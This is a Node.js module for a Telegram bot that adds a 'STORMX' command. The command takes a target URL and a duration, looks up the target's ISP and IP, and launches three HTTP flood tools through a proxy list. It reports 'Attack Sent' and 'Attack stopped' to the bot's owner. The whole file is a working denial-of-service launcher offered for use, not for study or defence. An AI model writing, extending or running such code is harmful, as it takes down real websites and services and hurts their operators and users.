const { exec } = require("child_process");
const path = require("path");
const config = require("../config");
const axios = require("axios");

module.exports = (bot) => {

    if (!global.runningProcesses) {
        global.runningProcesses = [];
    }

    bot.onText(/\STORMX (.+)/, async (msg, match) => {

        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (userId !== config.ownerId)
            return bot.sendMessage(chatId, "Access denied.");

        const args = match[1].split(" ");
        if (args.length < 2)
            return bot.sendMessage(chatId, "wait WTF, run like this: STORMX <url> <duration>");

        const [target, duration] = args;

        let hostname, port;

        try {
            const parsedUrl = new URL(target);
            hostname = parsedUrl.hostname;
            port = parsedUrl.port || "443";
        } catch {
            return bot.sendMessage(chatId, "Invalid URL format.");
        }

        let isp = "N/A", asn = "N/A", ip = "N/A";

        try {
            const response = await axios.get(
                `http://ip-api.com/json/${hostname}?fields=isp,query,as`
            );
            const data = response.data;
            isp = data.isp || "N/A";
            asn = data.as || "N/A";
            ip = data.query || "N/A";
        } catch {}

        // 🎬 VIDEO START
        const startVideo = "https://image2url.com/r2/default/videos/1771809700902-cfd02e71-635d-4a51-943d-14fef2e8a889.mp4";

        await bot.sendVideo(chatId, startVideo, {
            caption: `
🚀 Attack Sent starting
──────────────────────
🌐 Host: ${hostname}
📌 Port: ${port}
⏱️ Duration: ${duration}s
📡 Method: STORMX
──────────────────────
🏢 ISP: ${isp}
🏷️ ASN: ${asn}
🌍 IP: ${ip}
📣 Status: In Progress
📢 HostNetLive: https://check-host.net/check-http?host=${target}
            `,
            supports_streaming: true
        });

        const toolPath1 = path.join(__dirname, "../tools/H2.js");
        const toolPath2 = path.join(__dirname, "../tools/TO.js");
        const toolPath3 = path.join(__dirname, "../tools/FLOOD.js");

        const child1 = exec(`node --max-old-space-size=8124 "${toolPath1}" "${target}" "${duration}" 1000 200 ../userbot/tools/proxy.txt`);
        const child2 = exec(`node --max-old-space-size=8124 "${toolPath2}" "${target}" "${duration}" 3000 400 ../userbot/tools/proxy.txt`);
        const child3 = exec(`node --max-old-space-size=8124 "${toolPath3}" "${target}" "${duration}" 1000 300 ../userbot/tools/proxy.txt flood`);

        global.runningProcesses.push(child1, child2, child3);

        const cleanup = (proc) => {
            global.runningProcesses =
                global.runningProcesses.filter(p => p !== proc);
        };

        child1.on("close", () => cleanup(child1));
        child2.on("close", () => cleanup(child2));
        child3.on("close", () => cleanup(child3));

        child1.on("error", () => cleanup(child1));
        child2.on("error", () => cleanup(child2));
        child3.on("error", () => cleanup(child3));


        // 🎬 VIDEO FINISH
        setTimeout(async () => {

            const finishVideo = "https://image2url.com/r2/default/videos/1771809208778-258a65b9-593b-42d7-85ad-874b90afa906.mp4";

            await bot.sendVideo(chatId, finishVideo, {
                caption: `
✅  Attack stopped
──────────────────────
🌐 Host: ${hostname}
📌 Port: ${port}
⏱️ Duration: ${duration}s
📡 Method: STORMX
──────────────────────
🏢 ISP: ${isp}
🏷️ ASN: ${asn}
🌍 IP: ${ip}
📊 Status: Successfully
📢 HostNetLive: https://check-host.net/check-http?host=${target}
                `,
                supports_streaming: true
            });

        }, duration * 1000);

    });
};